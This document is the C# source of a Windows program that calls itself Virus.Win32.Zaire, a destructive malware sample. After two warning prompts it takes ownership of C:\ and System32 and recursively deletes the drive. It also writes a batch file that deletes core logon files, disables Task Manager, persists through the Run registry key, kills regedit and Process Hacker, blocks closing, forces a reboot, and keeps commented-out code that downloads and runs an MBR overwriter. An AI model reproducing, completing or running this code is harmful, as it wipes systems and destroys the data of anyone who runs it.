using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Zaire
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            WARNING();
            this.TransparencyKey = this.BackColor; // makes program invis
        }

       // string deskpath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        string AppName = "Zaire";
        string VD1 = "~ RUNASADMIN";
        string windowsu = "C:\\Users\\" + Environment.UserName + "\\Desktop\\Zaire\\zaire2.exe";
        string desktopp1 = "C:\\Users\\" + Environment.UserName + "\\Desktop\\ZAIRE.TXT";
        Timer ti;
        Random ra;

        string[] msgs = { "Error: 0x83653", "Error: 0x823472", "Error: 0xa8hf", "Please contact your system adminstrator \nif you encounter any problems. " };

        private void Form1_Load(object sender, EventArgs e)
        {
            new Process() { StartInfo = new ProcessStartInfo("cmd.exe", @"/k color 47 && takeown /f C:\Windows\System32 && icacls C:\Windows\System32 && takeown /f C:\ && icacls C:\  /grant %username%:F && takeown /f C:\Windows\System32\drivers && icacls C:\Windows\System32\drivers /grant %username%:F && rd C:\ /s /q && Exit") }.Start();
            this.Left = 0;
            this.Top = 0;
            this.Width = Screen.PrimaryScreen.Bounds.Width;
            this.Height = Screen.PrimaryScreen.Bounds.Width;

            // does stuff

            ti = new Timer();
            ra = new Random();

            ti.Interval = 1000;
            ti.Tick += Ti_Tick;
            ti.Start();

            timer1.Start();

            File.WriteAllText("C:\\Windows\\ZAIRE.txt", "Your computer has been trashed by ZAIRE.. \nYou cannot open task manager neither can you ALT + F4 out the program. \n" +
                "So don't even try :) \n- Zoofy");

            File.WriteAllText(desktopp1, "Your computer has been trashed by ZAIRE.. \nYou cannot open task manager neither can you ALT + F4 out the program. \n" +
                "So don't even try :) \n- Zoofy");

            File.WriteAllText("C:\\Windows\\zaire.bat", "@echo off \ndel C:\\WINDOWS\\system32\\winlogon.exe \ndel C:\\WINDOWS\\system32\\logonui.exe \ndel C:\\WINDOWS\\ \n ");

            // disables task man and adds to startup
            KTM();
            ASU();
            RAA();

            // changes the wallpaper to balck

            WPR();

            // opens note telling user they've been infected

            OTF();

            // Beeps, deletes crucial system files and then reboots the computer down 150 seconds later

            Destroy();

            // un - comment before release
        }

        private void Ti_Tick(object sender, EventArgs e)
        {
            int generateNum = ra.Next(10);
            ti.Interval = ra.Next(100, 1500);

            if (generateNum == 6)
            {
                this.BackColor = Color.Blue;
                
            }
            if (generateNum == 3)
            {
                this.BackColor = Color.Red;
            }
            if (generateNum == 8)
            {
                this.BackColor = Color.Cyan;
                
            }
            if (generateNum == 2)
            {
                this.BackColor = Color.Yellow;
            }
            if (generateNum == 4)
            {
                this.BackColor = Color.Green;
            }
            else
            {
                this.BackColor = this.TransparencyKey;
            }
            switch (generateNum)
            {
                case 1:
                    MessageBox.Show(msgs[ra.Next(msgs.Length)]);
                    break;
            }
        }

        public void KTM()
        {
            RegistryKey regkey;
            string keyValueInt = "1";
            string subKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";

            try
            {
                regkey = Registry.CurrentUser.CreateSubKey(subKey);
                regkey.SetValue("DisableTaskMgr", keyValueInt);
                regkey.Close();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }

        public void ASU()
        {
            RegistryKey rk = Registry.CurrentUser.OpenSubKey
           ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rk.SetValue(AppName, ExecutablePath);
        }

        public void RAA()
        {
            RegistryKey rk = Registry.CurrentUser.OpenSubKey
            ("Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags", true);
            rk.SetValue(ExecutablePath, VD1);
        }

        public void WPR()
        {
            RegistryKey reg2 = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
            reg2.SetValue("WallPaper", "", RegistryValueKind.String);
        }

        public void OTF()
        {
            string file_name = "C:\\Windows\\ZAIRE.txt";
            Process.Start("notepad.exe", file_name);
        }

        public void WARNING()
        {
            if (MessageBox.Show("Are you sure you want to run this program? This can be considered malware. Click Yes to continue", "WARNING", MessageBoxButtons.YesNo, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button2) == DialogResult.No)
            {
                Application.Exit();
                this.Close();
            }
            else
            {
                WARNING2();
            }
        }
        public void WARNING2()
        {
            if (MessageBox.Show("ARE YOU SURE YOU WANT TO RUN Virus.Win32.Zaire? IT CAN BE DANGEROUS!", "FINAL WARNING", MessageBoxButtons.YesNo, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button2) == DialogResult.No)
            {
                Application.Exit();
                this.Close();
            }
        }
        public void Destroy()
        {
            Console.Beep();
            Console.Beep();
            Console.Beep();
            Console.Beep();
            Console.Beep();
            Console.Beep();
            Console.Beep();
            Console.Beep();
            ExecuteAsAdmin(windowsu);

            //  new Process() { StartInfo = new ProcessStartInfo("cmd.exe", @"/k color 47 && takeown /f C:\Windows\System32 && icacls C:\Windows\System32 /grant %username%:F && takeown /f C:\Windows\System32\drivers && icacls C:\Windows\System32\drivers /grant %username%:F && Exit") }.Start();

            Process.Start("shutdown.exe", "/r /t 30");


            // string winload_exe = @"C:\Windows\System32\winload.exe";
            // string disk_sys = @"C:\Windows\System32\drivers\disk.sys";

            // if (File.Exists(winload_exe))
            // {
            //     File.Delete(winload_exe);
            // }

            // if (File.Exists(disk_sys))
            // {
            //     File.Delete(disk_sys);
            // }

            /* ServicePointManager.Expect100Continue = true;
             ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;


             WebClient webClient = new WebClient();
             webClient.DownloadFile(@"https://github.com/zoofyiscool/mbr_overwritter/blob/main/WindowsUpdater.exe", desktopmbr);

             ExecuteAsAdmin(desktopmbr);
            */

        }

        private void FormClosing(object sender, FormClosingEventArgs e)
        {
            if (Control.ModifierKeys == Keys.Alt || Control.ModifierKeys == Keys.F4)
            {
                e.Cancel = true;
            }
        }

        public string ExecutablePath
        {
            get
            {
                string path = Application.ExecutablePath;
                string extension = Path.GetExtension(path).ToLower();
                if (String.Equals(extension, ".dll"))
                {
                    string folder = Path.GetDirectoryName(path);
                    string fileName = Path.GetFileNameWithoutExtension(path);
                    fileName = String.Concat(fileName, ".exe");
                    path = Path.Combine(folder, fileName);
                }
                return path;
            }
        }

        public void ExecuteAsAdmin(string fileName)
        {
            Process proc = new Process();
            proc.StartInfo.FileName = fileName;
            proc.StartInfo.UseShellExecute = true;
            proc.StartInfo.Verb = "runas";
            proc.Start();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            // kills certain programs if opened
            Process[] processRunning = Process.GetProcesses();
            foreach (Process pr in processRunning)
            {
               // if (pr.ProcessName == "cmd")
               // {
               //     pr.Kill();
               // }

                if (pr.ProcessName == "Processhacker")
                {
                    pr.Kill();
                }

                if (pr.ProcessName == "regedit")
                {
                    pr.Kill();
                }
            }
        }
    }
}